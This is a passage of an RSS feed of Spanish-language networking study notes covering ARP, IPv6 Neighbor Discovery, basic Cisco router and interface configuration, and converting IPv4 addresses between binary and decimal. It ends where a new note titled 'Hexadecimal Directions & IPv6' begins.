<br><br><br>Cuando se envía un paquete a la capa de enlace de datos para encapsularlo en una trama de Ethernet, el dispoistiivo consulta una tabal en su memoria para encontrar la dirección MAC que está asignada a la dirección IPv4. Esta tabla se almacena temporalmente en la memoria RAM y se denomina tabla ARP o caché ARP.<br>El dispositivo emisor busca en su tabla ARP la dirección IPv4 de destino y la dirección MAC correspondiente.<br>
<br>Si la dirección IPv4 de destino del paquete está en la misma red que la dirección IPv4 de origen, el dispositivo busca la dirección IPv4 de destino en la tabla ARP.
<br>Si la dirección IPv4 de destino esta´en una red diferente que la dirección IPv4 de origen, el dispostivo busca la dirección IPv4 del default gateway.
<br>En ambos casos, se realiza una búsqued de la dirección IPv4 y la dirección MAC correspondiente para el dispositivo.<br>En cada entrada o fila de la tabla ARP, se enlaza una dirección IPv4 con una dirección MAC. Llamamos a la relación entre los dos valores un mapa. Eszto solamente significa que es posible buscar una dirección IPv4en la tabla y encontrar la dirección MAC correspondiente. La tabla ARP almacena temporalmente (En caché) la asignación para los dispositivos de la LAN.<br>Si el dispositivo localiza la dirección IPv4, se utiliza la dirección MAC  correspondeinte como la dirección MAC de destino de la trama. Si no se encuentra ninguna netrada, el dispositivo envía una solicitud de ARP.<br><img alt="Pasted image 20241024142601.png" src="https://dobliuw.com/lib/media/pasted-image-20241024142601.png" style="width: 500px; max-width: 100%;"> <img alt="Pasted image 20241024142616.png" src="https://dobliuw.com/lib/media/pasted-image-20241024142616.png" style="width: 500px; max-width: 100%;"><br>
<img alt="Pasted image 20241024142736.png" src="https://dobliuw.com/lib/media/pasted-image-20241024142736.png" style="width: 500px; max-width: 100%;"> <img alt="Pasted image 20241024142637.png" src="https://dobliuw.com/lib/media/pasted-image-20241024142637.png" style="width: 500px; max-width: 100%;"><br><br><br>Se envía una solicitud ARP cuando un dispositivo necesita determinar la dirección MAC que está asociada con una dirección IPv4, y no tiene una entrada para la dirección IPv4 en su tabla ARP.<br>Los mensajes de ARP se encapsulan directamente dentro de una trama de Ethernet. No se utiliza una encabezado de IPv4. La solicitud de ARP se encapsula en una trama de Ethernet con la siguiente información de encabezado:<br>
<br>Destination MAC Address: Esta es una dirección broadcast que requiere que todas las NIC Ethernet de la LAN acepten y procesan la solicitud de ARP.
<br>Origin MAC Address: Esta es la dirección MAC del remitente de la solicitud ARP.
<br>Type: Los mensajes ARP tienen un campo de tipo de 0x806. Esto informa a la NIC receptora que la porción de datos de la trama se debe enviar al proceso ARP.
<br>Como las solicitudes de ARp son de broadcast, el swtich las envía por todos los puertos, excepto por el de recepción. Todas las NIC Ethernet de la LAN procesan transmisiones y deben entregar la solicitud ARP a su sistema operativo para su procesamiento. Cada dispositivo debe procesar la solicitud de ARP para ver si la dirección IPv4 objetivo coincide con la suya. Un router no reenvía broadcasts por otras inferfaces.<br>Solo un dispositivo de la LAN tiene la dirección IPv4 que coincide con la dirección IPv4 objetivo de la solicitud de ARP. Todos los demás dispositivos no envían una respuesta.<br><br><br>Solo el dispositivo con la dirección IPv4 de destino asociada con la solicitud ARP responderá con una respuesta ARP. La respuesta de ARP se encapsula en una trama de Ethernet con la siguiente información de header:<br>
<br>Destination MAC Address: Es la dirección MAC del remitente de la solicitud de ARP.
<br>Origin MAC Address: Esta es la dirección MAC del remitente de la respuesta ARP.
<br>Type: Los mensajes ARP tienen un campo de tipo de 0x806. Esta informa a la NIC receptora que la porción de datos de la tramas se debe envíar al proceso ARP.
<br>Solamente el dispositivo que envió inicialmente la solicitud de ARP recibe la respuesta de ARP de unicast. Una vez que recibe la respuesta de ARP, el dispositivo agrega la dirección IPv4 y la dirección MAC correspondiente a su tabal ARP. A partir de ese momento, los paquetes destinados para esa dirección IPv4 se pueden encapsular en las tramas con su dirección MAC correspondiente.<br>Si ningún dispositivo responde a la solicitud de ARP, el paquete se descarta porque no se puede crear una trama.<br>Las entradas de la tabla ARP tienen marcas de tiempo. Si un dispositivo no recibe una trama de un dispositivo en particular antes de que caduque la marca de tiempo, la entrada para este dispositivo se elimina de la tabla ARP. <br>Además, se pueden introdfucir entradas estáticas de asignaciones en una tabla  ARP, pero esto no sucede con frecuencia. Las entradas estáticas de la tabla ARP no caducan con el timpo y se deben eliminar de forma manual.<br>IPv6 utiliza un proceso similar a ARP para IPv4, conocido como ICMPv6 Neighbour Discovery (ND). IPv6 utiliza mensajes de solicitud de vecino y de anuncio de vecino similares a las solicituds y respuestas de ARP de IPv4.<br><br><br>Cuando la dirección IPv4 de destino no está en la misma red que la dirección IPv4 de origen, el dipositivo de origen debe enviar la trama al default gateway. Esta es la interfaz del router local. Cuando un dipositivo de origen tiene un paquete con la dirección IPv4 de otra red, lo encapsula en una trama con la dirección MAC de destino del router.<br>La dirección IPv4 de la dirección del default gateway se almacena en la configuración IPv4 de los hosts. Cuando un host crea un paquete para un destino, compara la dirección IPv4 de destino con la propia para determina si ambas están ubicadas en la misma red de Capa 3. Si el host de destino no está en la misma red, el origen busca en la tabla ARP una entrada que contenga la dirección IPv4 del default gateway. SI no existe una entrada, utiliza el proceso ARP para detrminar la dirección MAC del mismo.<br><br><br>Para cada dispositivo, un temporaizador de memoria caché ARP elimina las entradas de ARP que no se hayan utilizado durante un período especifícado. Los tiempos varían según el sistema operativo del dispositivo. Por ejemplo, los sistemas operativos Windows más recientes almacenan entradas de la tabla ARP entre 15 y 45 segundos, como se muestra en la siguiente imagen: <br><img alt="Pasted image 20241025110651.png" src="https://dobliuw.com/lib/media/pasted-image-20241025110651.png"><br>Los comandos también se pueden usar para eliminar manualmente algunas o todas las entradas de la tabla  ARP. Después de eliminar una erntrada, el proceso de envío de una solicitud de ARP y de recepción de una respuesta de ARP debe ocurrir nuevamente para qeu se introduzca la asinación en la tabla ARP.<br><br><br>Por ejemplo, en un router Cisco, el comando show ip arp se utiliza para mostrar la tabla ARP:<br>
<br>Showing the ARP Table in a Cisco Router.
<br>R1&gt; enable
R1# show ip arp
Protocol  Address          Age (min)  Hardware Addr   Type   Interface
Internet  192.168.10.1            -   a0e0.af0d.e140  ARPA   GigabitEthernet0/0/0
Internet  209.165.200.225         -   a0e0.af0d.e141  ARPA   GigabitEthernet0/0/1
Internet  209.165.200.226         1   a03d.6fe1.9d91  ARPA   GigabitEthernet0/0/1
R1#
Copy<br>En una PC con Windows 10, el comando arp -a mostrará la tabla ARP:<br>
<br>Showing the ARP Table in a Windows 10/11 Workstation.
<br>C:\Users\Workstation&gt; arp -a 
Interface: 192.168.1.124 --- 0x10
  Internet Address      Physical Address      Type
  192.168.1.1           c8-d7-19-cc-a0-86     dynamic
  192.168.1.101         08-3e-0c-f5-f7-77     dynamic
  192.168.1.110         08-3e-0c-f5-f7-56     dynamic
  192.168.1.112         ac-b3-13-4a-bd-d0     dynamic
  192.168.1.117         08-3e-0c-f5-f7-5c     dynamic
  192.168.1.126         24-77-03-45-5d-c4     dynamic
  192.168.1.146         94-57-a5-0c-5b-02     dynamic
  192.168.1.255         ff-ff-ff-ff-ff-ff     static
  224.0.0.22            01-00-5e-00-00-16     static
  224.0.0.251           01-00-5e-00-00-fb     static
  239.255.255.250       01-00-5e-7f-ff-fa     static
  255.255.255.255       ff-ff-ff-ff-ff-ff     static
  
C:\Users\Workstation&gt;
Copy<br><br><br>Todos los dispositivos de la red local recibe y procesan una solicitud de ARP debido a que es una trama broadcast. En una red comercial típica, estas difusiones tendrían, probablemente, un efecto mínimo en el rendimineto de la red. Sin embargo, si se encendiera una gran cantidad de dispositivos que comenzaran a acceder a los servicios de red al mismo tiempo, el rendimiento podría disminuir durante un breve período, como se muestra en la imagen a continuación. Después que los dispositivos envían las solicitudes de difusión ARP iniciales y obtienen las direcciones MAC necesarias, se minimiza cualquier efecto en la red.<br><img alt="Pasted image 20241025111353.png" src="https://dobliuw.com/lib/media/pasted-image-20241025111353.png"><br>En algunos casos, el uso de ARP puede conducir a un riesgo potencial de seguridad. Un atacante puede usar la suplantación ARP para realizar un ataque de envenenamiento ARP. Como sabemos, esta técnica descrita en el artículo <a data-href="ARP Spoof - Envenenamiento ARP" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/networks/attacks/arp-spoof-envenenamiento-arp.html" class="internal-link" target="_self" rel="noopener nofollow">ARP Spoof - Envenenamiento ARP</a>, es una técnica utilizada por un atacante par responder a una solicitud de ARP de una dirección IPv4 que pertenece a otro dispositivo, como podría ser el default gateway, como se muestra en la imagen de abajo. El atacante envía una respuesta de ARP con su propia dirección MAC. El receptor de la respuesta de ARP agrega la dirección MAC incorrecta a su tabla ARP y envía los paquetes destinados al default gateway al atacante . Los switches de nivel empresarial incluyen técnicas de mitigación conocidas como Dynamic Inspection ARP / Inspección Dinámica de ARP (DAI). DAI está más allá del alcance de esté articulo.<br><img alt="Pasted image 20241025111841.png" src="https://dobliuw.com/lib/media/pasted-image-20241025111841.png">]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/1.-layer-3-to-7/arp/1.-arp-address-resolution-protocol.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/4. Layers/1. Layer 3 to 7/ARP/1. ARP - Address Resolution Protocol.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Fri, 25 Oct 2024 14:18:42 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/pasted-image-20241023124613.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/pasted-image-20241023124613.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[IPv6 Neighbor Discovery]]></title><description><![CDATA[ 
 <br><br>Si la red utiliza el protocolo de comunicaciones IPv6, el protocolo de detección de vecinos o ND es lo que se necesita para hacer coincidir las direcciones IPv6 con las direcciones MAC. En este articulo se explicará cómo funciona este protocolo (ND).<br><img alt="Pasted image 20241025115534.png" src="https://dobliuw.com/lib/media/pasted-image-20241025115534.png" style="width: 600px; max-width: 100%;"><br>El host que desea enviar una trama Ethernet a una determinada dirección IPv6, primero verifica en la Neighbor Cache si tiene asociada la dirección IPv6 con una MAC (Similar a la tabla ARP). En caso de no hacerlo, pondrá la trama en cola y creara una nueva (Neighbor Solicitation).<br><img alt="Pasted image 20241025115536.png" src="https://dobliuw.com/lib/media/pasted-image-20241025115536.png" style="width: 600px; max-width: 100%;"><br>Esta nueva trama Ethernet creada tendrá en el Header Ethernet, en la sección de Destinaton MAC una Multicast MAC. <br><img alt="Pasted image 20241025115721.png" src="https://dobliuw.com/lib/media/pasted-image-20241025115721.png"><br>Esta trama será enviada al Switch el cual reenviará las tramas a los hosts de la red.<br><img alt="Pasted image 20241025115852.png" src="https://dobliuw.com/lib/media/pasted-image-20241025115852.png" style="width: 600px; max-width: 100%;"><br>Una vez que la trama llegue al host destino que coincida tanto la MAC Multicast como la dirección IPv6, el host aceptará la trama y creará una nueva trama de respuesta (Neighbor Advertisement) agregando el camp Target MAC, donde incluirá su dirección MAC para reenviar esta trama al host inicial.<br><img alt="Pasted image 20241025115953.png" src="https://dobliuw.com/lib/media/pasted-image-20241025115953.png" style="width: 600px; max-width: 100%;"><br>Una vez que la trama Ethernet llega al host inicial, el mismo tomará la MAC address asociada a la dirección IPv6 que quería enviar inicialmente, actualizará las entradas de la Neighbor Cache, asociando dicha dirección IPv6 con su correspondiente MAC y sacará la trama inicial de la cola, modificará el campo del Header Ethernet Destination MAC agregando la dirección MAC Obtenida.<br><img alt="Pasted image 20241025120027.png" src="https://dobliuw.com/lib/media/pasted-image-20241025120027.png" style="width: 600px; max-width: 100%;"><br>Similar al comportamiento de ARP (<a data-href="1. ARP - Address Resolution Protocol" href="https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/1.-layer-3-to-7/arp/1.-arp-address-resolution-protocol.html" class="internal-link" target="_self" rel="noopener nofollow">1. ARP - Address Resolution Protocol</a>), para la comunicación con otras redes se realizará este proceso con destino del Default Gateway (Router).<br>Las principales ventajas de ND frente a ARP es que este no utiliza broadcast, sino Multicast, lo que hace que se más e ficiente en redes más grandes. Adicionalmente en aspectos de seguridad, ND no es vulnerable a ARP Spoofing y es más segudo con SEND (Secure Nighbor Discovery), que añade firmas criptográficas a los mensajes, ayudando a mitigar este tipo de ataques y aumentado la seguridad ante ARP.<br>Así mismo ND añade funcionalidades adicionales frente a ARP, como el Router Discovery, SLAAC y DAD.<br><br><br>El protocolo IPv6 Neighbor Discovery se conoce a veces como ND o NDP. En este articulo haremos referencia a este como ND. ND proporciona servicios de resolución de direcciones, detección de routers y redirección para IPv6 mediante ICMPv6. ICMPv6 ND utiliza cinco mensajes ICMPv6 para realizar estos servicios:<br>
<br>NS: Mensajes de solicitud de vecinos.
<br>NA: Mensajes de anuncios de vecino.
<br>RS: Mensajes de solicitud del router.
<br>RA: Mensajes de anuncio del router. Mensaje de * redirección. 
<br>Los mensajes de solicitud de vecino y anuncio de vecino se utiliza para la mensajería de dispositivo a dispositivo, como la resolución de direcciones. (Como se exlico en la sección de arriba). Los dispositivos incluyen tanto equipos hosts como routers.<br><img alt="Pasted image 20241025121737.png" src="https://dobliuw.com/lib/media/pasted-image-20241025121737.png"><br>Los mensajes de solicitud de router y anuncio de router son para mensjaes entre dispositivos y routesrs. Normalmente, la detección de routers se utiliza para la asignación dinámica de direcciones y la configuración atomática de direcciones sin estado (SLAAC).<br><img alt="Pasted image 20241025121750.png" src="https://dobliuw.com/lib/media/pasted-image-20241025121750.png"><br>El quinto mensaje ICMPv6 ND es un mensaje de redirección que se utiliza para una mejor selección de siguiente salto. Esto estará fuera de este articulo.<br>IPv6 ND se define en IETF RFC 4861.<br><br><br>Al igual que ARP para IPv4, los dispositivos IPv6 utilizan IPv6 ND para determina la dirección MAC de un dispositivo que tiene uan dirección IPv6 conocida.<br>Los mensajes ICMPv6 Neighbor Solicitation y Neighbor Advertisement se utilizan para la resolución de la dirección MAC. Esto es similar a las solicitudes ARP ARP Requests y ARP Response utilizadas por ARP para IPv4. Por ejemplo, supongamos que PC1 desea hacer ping a PC2 en la dirección IPv6 2001:db8:acad::11. Para determina la dirección MAC de la dirección IPv5 conocida, PC1 envía un mensaje ICMPv6 Neighbor Solicitation como se muestra en la siguiente imagen: <br><img alt="Pasted image 20241025122440.png" src="https://dobliuw.com/lib/media/pasted-image-20241025122440.png"><br>Los mensajes de solicitud de veinos ICMPv5 se envía uitlizando direcciones multibroadcast Ethernet e IPv6 especiales. Esto permite qeu la NIC Ethernet del dispositivo receptor determine si el mensaje de solicitud devecino es para sí mismo sin tener qeu enviarlo al sistema operativo para su procesamiento.<br>PC2 responder a la solicitud con un ICMPv6 Neighbor Advertisement que incluye su dirección MAC.]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/4.-layers/1.-layer-3-to-7/arp/2.-icmpv6-neighbor-discovery-nd.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/4. Layers/1. Layer 3 to 7/ARP/2. ICMPv6 Neighbor Discovery - ND.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Fri, 25 Oct 2024 15:25:04 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/pasted-image-20241025115534.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/pasted-image-20241025115534.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Basic Steps for Configuring a Router]]></title><description><![CDATA[ 
 <br><br>Las tareas a realizar para llevar a cabo la configuración inicial de un Router son:<br>
<br>Configuración del nombre del dispositivo:
<br>Router(config)# hostname {hostname}
Copy<br>
<br>Proteger el modo EXEC de privilegio con credenciales:
<br>Router(config)# enable secret {password}
Copy<br>
<br>Proteger el modo EXEC de usuario con credenciales:
<br>Router(config)# line console 0
Router(config-line)# password {password}
Router(config-line)# login
Copy<br>
<br>Proteger el acceso remoto por Telnet y SSH:
<br>Router(config-line)# line vty 0 4
Router(config-line)# password {password}
Router(config-line)# login
Router(config-line)# trasnport input {ssh | telnet}
Copy<br>
<br>Proteger todas las contraseñas del archivo de configuración:
<br>Router(config-line)# exit
Router(config)# service password-encryption
Copy<br>
<br>Proporcionar una notificación legal:
<br>Router(config)# banner motd #Authorized personal access only!#
Copy<br><br><br>En este ejemplo, el router R1 del diagrama de topología se configurará con la configuración inicial: <br><img alt="Pasted image 20241025143849.png" src="https://dobliuw.com/lib/media/pasted-image-20241025143849.png"><br>Para configurar el nombre del dispositivo para R1, utilizariamos los siguientes comandos:<br>Router&gt; enable
Router# configure terminal
Router(config)# hostname R1
R1(config)# exit
Copy<br>Todo el acceso al router debe estar asegurado. El modo EXEC pribilegiado porporciona al usuario acceso completo al dispositivo y su configuración. Por lo tanto, es el modo más importante para asegurar. <br>Los sigueintes comandos aseguraran el modo EXEC privilegiado y de usario, habilitará el acceso remoto Telnet y SSH mediante credenciales y cifrará todas als contraseñas de texto sin formato. (Como se puede ver en detalle en <a data-href="0. Setting the Initial Router Parameters" href="https://dobliuw.com/notes/2.-networks/network-basics/5.-routers-&amp;-cli-configuration/0.-setting-the-initial-router-parameters.html" class="internal-link" target="_self" rel="noopener nofollow">0. Setting the Initial Router Parameters</a>):<br>R1# configure terminal
R1(config)# enable secret {password}
R1(config)# line console 0
R1(config-line)# password {password}
R1(config-line)# login
R1(config-line)# exit
R1(config)# line vty 0 4
R1(config-line)# password {password}
R1(config-line)# login
R1(config-line)# transport input ssh telnet
R1(config-line)# exit
R1(config)# service password-encryption
R1(config)#
Copy<br>Como sabemos, la notificación legal advierte a los usuarios que solo deben acceder al dispoisitivo los usuarios permitidos. La notificación legan se configurará de la sigueinte manera:<br>R1(config)# banner motd #
*************************************************
WARNING: Unauthorized access is prohibited! Go away!
*************************************************
# 
R1(config)#
Copy<br>Si se configuraron los comandos anteriores y el router perdió energía accidentalmente, se perderían todos los comandos configurados. Por esta razón, es imporatnte gruardar la configuración cuando se implementen los cambios. Los sigueintes comandos guardarán la configuración actual ubiacada en la RAM en la memoria ROM para volver a está la configuración guardada.<br>R1# copy running-config startup-config

Copy]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/5.-routers-&amp;-cli-configuration/0.-setting-the-initial-router-parameters.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/5. Routers &amp; CLI configuration/0. Setting the Initial Router Parameters.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Fri, 25 Oct 2024 17:59:08 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/pasted-image-20241025143849.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/pasted-image-20241025143849.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Routers Interfaces Configuration]]></title><description><![CDATA[ 
 <br><br>En este punto, los routers tienen sus configuraciones básicas. El sigueinte paso es configurar sus interfaces. Esto se debe a que los dispositivos finales no pueden acceder a los enrutadores hasta qeu se configuran las interfaces. Existen muchos tipos diferentes de interfaces para los routers Cisco. Por ejemplo, el router Cisco ISR 4321 está equipado con dos interfaces Gigabit Ethernet:<br>
<br>GigabitEthernet 0/0/0 (G0/0/0).
<br>GigabitEthernet 0/0/1 (G0/0/1)
<br>La tarea de configurar una interfaz de router es muy similar a un SVI de ad ministración en un conmutador. Específicamente, incluye la emisión de lo sigueintes comandos:<br>Router(config)# interface {type-and-number}
Router(config-if)# description {description-text}
Router(config-if)# ip address {ipv4_address} {subnet_mask}
Router(config-if)# ipv6 address {ipv6_address}/{prefix_length}
Router(config-if)# no shutdown
Copy<br>Aunque el comando description no es necesario para habilitar una interfaz, es una buena práctica usarlo. Puede ser útil para solucionar problemas en redes de producción proporcinoando información sobre el tipo de red conectada. Si la interfaz se conecta a un ISP o a un proveedor de servicios de telefonía móvil, description resulta útil introducir la información de contacto y de conexión de dichos terceros.<br>Al usar el comando no shutdown se activa la interfaz y es similar a darle energía. La interfaz también debe estar conectada a otro dispositivo, comom un switch o un router, para que la capa física se active.<br>En las conexiones entre routers donde no hay un conmutador Ethernet, ambas interfaces de interconexión dbeen estar configuradas y habilitadas.<br><br><br>En este ejemplo, se habilitarán las interfaces directamente conectadas de R1 en el diagrama de topología: <br><img alt="Pasted image 20241025143849.png" src="https://dobliuw.com/lib/media/pasted-image-20241025143849.png"><br>Para configurar las interfaces en R1, se utilizarían los siguientes comandos:<br>R1&gt; enable
R1# configure terminal
R1(config)# interface gigabitEthernet 0/0/0
R1(config-if)# description Link to LAN
R1(config-if)# ip address 192.168.10.1 255.255.255.0
R1(config-if)# ipv6 address 2001:db8:acad:10::1/64
R1(config-if)# no shutdown
R1(config-if)# exit
R1(config)#
*Aug  1 01:43:53.435: %LINK-3-UPDOWN: Interface GigabitEthernet0/0/0, changed state to down
*Aug  1 01:43:56.447: %LINK-3-UPDOWN: Interface GigabitEthernet0/0/0, changed state to up
*Aug  1 01:43:57.447: %LINEPROTO-5-UPDOWN: Line protocol on Interface GigabitEthernet0/0/0, changed state to up
R1(config)# interface gigabitEthernet 0/0/1
R1(config-if)# description Link to R2
R1(config-if)# ip address 209.165.200.1 

Copy]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/5.-routers-&amp;-cli-configuration/2.-interfaces-configuration.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/5. Routers &amp; CLI configuration/2. Interfaces Configuration.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Fri, 25 Oct 2024 18:07:22 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/pasted-image-20241025143849.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/pasted-image-20241025143849.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Binary Directions &amp; IPv4]]></title><description><![CDATA[ 
 <br><br>Las direcciones IPv4 comienzan como binarias, una serie de solo 1 y 0. Estos son difíciles de administrar, por lo que los administradores de red deben convertirlos a decimales. Como sabemos el sistema binario (<a data-href="0. Binary" href="https://dobliuw.com/notes/0.-needed-concepts/systems/0.-binary.html" class="internal-link" target="_self" rel="noopener nofollow">0. Binary</a>) es un sistema de numeración base 2 que consta de los dígitos 0 y 1, llamado bits.<br>Es importante la comprensón de este sistema, ya que los hosts, los servidores y los disposiitivos de red usan el direccionamiento binario. Específicamente, usan direcciones IPv4 binarias, como se muestra en esta imágen:<br><img alt="binary_directions_ipv4_example_image.png" src="https://dobliuw.com/lib/media/binary_directions_ipv4_example_image.png"><br>Cada dirección consta de una cadena de 32 bits, divididos en cuatro secciones denominadas octetos. Cada octeto contiene 8 bits (o 1 byte) separadas por un punto. Por ejemplo, a la PC1 de la imagén se le asignó la dirección IPv4 11000000.10101000.00001010.00001010. La dirección de gateway predeterminado sería la interfaz Gigabit Ethernet del R1, 11000000.10101000.00001010.00000001.<br>Este sistema funciona muy bien con hosts y dispositivos de red. Sin embargo, como vemos es muy difícil para nosotros los humanos trabajar con este.<br>Para facilitar el uso, las direcciones IPv4 se expresan comúnmente en notación decimal con puntos. A la PC1 se le asgina la dirección 192.168.10.10, y como gateway predeterminado se le asigna la dirección 192.168..10.1:<br><img alt="decimal_directions_ipv4_example_image.png" src="https://dobliuw.com/lib/media/decimal_directions_ipv4_example_image.png"><br><br><br>Para aprender a convertir de sistema binario a decimal, es necesario entender la notación de posición. El término "notación de posición" signigica que un dígito representa diferentes valores según la "posición" que el dígito ocupa en la secuencia de números. <br>El sistema decimal es un sistema base 10, lo que ínidica que esta base númerica, también denominada radix, se basa en 10.<br><br>Base 10 - (0,1,2,3,4,5,6,7,8,9)<br>Para calcular el valor posicional se toma la raíz (radix) y se la elevá por el valor exponencial de su posición. Así mismo, para usar el sistema de posición, hay que unir el número con su valor de posición, por ejemplo, con el número 1234 sería:<br><br>Teniendo en cuenta esto, el sistema binario es un sistema base 2, lo que índica que la base númerica se basa en 2.<br><br>Base 2 - (0,1)<br>De igual manera, para calcular el valor posicional se toma la raíz y se la elevá por el valor exponencial de su posición. Por ejemplo, a continuación se mostrará como se puede convertir a decimal el valor del número binario 11000000, obteniendo como resultado el número decimal 192:<br><br>Una vez entendido esto,  por cada octeto de una dirección IP se puede aplicar la misma lógica para resolver cada valor decimal de cada octeto.<br><br><br>También es necesario entender cómo convertir una dirección IPv4 decimal punteada a una binaria. Para esto deberemos válidar por cada octeto cada posición de la tabla de valores binarios y contemplar si el número del primer octeto es mayor o menor al bit más signifiativo (128), si no es se colocará un 0 en el valor posicional del 128, de lo contrario, se agregara un 1 y se restara el valor posicional 128 al número del octeto, y así se continuará hasta quedar con el valor de 0 y hallar con conversión en sistema binario.<br>Para poder comprender este proceso mejor, vamos a utilizar de ejemplo la dirección IPv4 192.168.11.10.<br>En este caso utilizaremos el primer y segundo octeto dado que el tercer y cuarto octeto (11 y 10) son relativamente sencillos de calcular, por lo cual rápidamente podemos saber que los valores binarios de estos equivalen a 00001011 y 00001010.<br>
<br>Primer octeto (192)
<br>¿El primer octeto número 192 es igual o mayor a el bit más significativo 128? Como es el caso, añadiremos un 1 al valor posicional del bit más significativo y restaremos 128 al valor inicial de 192, lo que nos deja como resultado un resto de 64.<br><img alt="decimal_to_binary_octet_example_image_1.png" src="https://dobliuw.com/lib/media/decimal_to_binary_octet_example_image_1.png"><br>Ahora continuaremos con nuestro resto, el cual es 64 y lo que nos debemos preguntar es, ¿64 es igual o mayor que el siguiente bit (64)? Como nuevamente la respuesta es si, agregamos un 1 al siguiente valor posicional de alto orden y restamos el valor posicional 64 a nuestro resto, 64, lo que nos deja en 0, y como nuestro resto es 0, en las siguientes posiciones restantes agregaremos un 0. <br><img alt="decimal_to_binary_octete_example_image_2.png" src="https://dobliuw.com/lib/media/decimal_to_binary_octete_example_image_2.png"><br>
<br>Segundo octeto (168)
<br>¿El primer octeto número 168 es igual o mayor a el bit más significativo 128? Como es el caso, añadiremos un 1 al valor posicional del bit más significativo y restaremos 128 al valor inicial de 192, lo que nos deja como resultado un resto de 40.<br><img alt="decimal_to_binary_second_octet_example_image_1.png" src="https://dobliuw.com/lib/media/decimal_to_binary_second_octet_example_image_1.png"><br>Ahora continuaremos con nuestro resto, el cual es 40 y lo que nos debemos preguntar es, ¿40 es igual o mayor que el siguiente bit (64)? Como la respuesta es no, agregaremos un 0 binario en el valor posicional 64 y continuaremos con los demás valores posicionales.<br><img alt="decimal_to_binary_second_octet_example_image_2.png" src="https://dobliuw.com/lib/media/decimal_to_binary_second_octet_example_image_2.png"><br>Todavía con nuestro resto 40, nos preguntamos ¿Es 40 igual o mayor que el siguiente bit (32)? Como la respuesta es si agregaremos un 1 binario en dicho valor posicional y restaremos nuestro resto con este valor (40-32) lo que nos deja un nuevo resto de 8.<br><img alt="decimal_to_binary_second_octet_example_image_3.png" src="https://dobliuw.com/lib/media/decimal_to_binary_second_octet_example_image_3.png"><br>Continuando con nuestro nuevo resto, 8 nuevamente nos preguntamos ¿Es 8 igual o mayor que el siguiente bit (16)? Como la respuesta es no, agregaremos un 0 binario en el valor posicional 16 y continuaremos con los demás valores posicionales.<br><img alt="decimal_to_binary_second_octet_example_image_4.png" src="https://dobliuw.com/lib/media/decimal_to_binary_second_octet_example_image_4.png"><br>Continuando con nuestro resto, el cual es 8 nos preguntamos, ¿8 es igual o mayor que el siguiente bit (8)? Como la respuesta es si, agregamos un 1 al siguiente valor posicional de alto orden y restamos el valor posicional 8 a nuestro resto, 8, lo que nos deja en 0, y como nuestro resto es 0, en las siguientes posiciones restantes agregaremos un 0. <br><img alt="decimal_to_binary_second_octet_example_image_5.png" src="https://dobliuw.com/lib/media/decimal_to_binary_second_octet_example_image_5.png"><br><br><br>Como mencionamos al principio de este tema, los routers y las computadoras solo entienden binario, mientras que los humanos trabajamos en decimal. Por esto es importante entender a fondo estos dos sistemas de numeración y cómo se utilizan en redes.<br>Para cerrar, entonces sabemos que las direcciones IPv4 las leemos diariamente en formato decimal punteado, como por ejemplo 192.168.10.10. Pero esta dirección IP consta de 4 octeteos, es decir, cuatro segmentos de 8 bits cada uno:<br><img alt="4_octets_example_image_ipv4_directions.png" src="https://dobliuw.com/lib/media/4_octets_example_image_ipv4_directions.png"><br>Y por ende, entendemos que estas direcciones comúnmente utilizadas son direcciones de 32 bits en total:<br><img alt="32_bits_example_image_ipv4_directions.png" src="https://dobliuw.com/lib/media/32_bits_example_image_ipv4_directions.png">]]></description><link>https://dobliuw.com/notes/2.-networks/network-basics/binary-and-decimal-systems-&amp;-ipv4-directions.html</link><guid isPermaLink="false">Notes/2. Networks/Network Basics/Binary and Decimal Systems &amp; IPv4 Directions.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 03 Oct 2024 15:44:50 GMT</pubDate><enclosure url="https://dobliuw.com/lib/media/binary_directions_ipv4_example_image.png" length="0" type="image/png"/><content:encoded>&lt;figure&gt;&lt;img src=&quot;https://dobliuw.com/lib/media/binary_directions_ipv4_example_image.png&quot;&gt;&lt;/figure&gt;</content:encoded></item><item><title><![CDATA[Hexadecimal Directions &amp; IPv6]]></title><description><![CDATA[ 
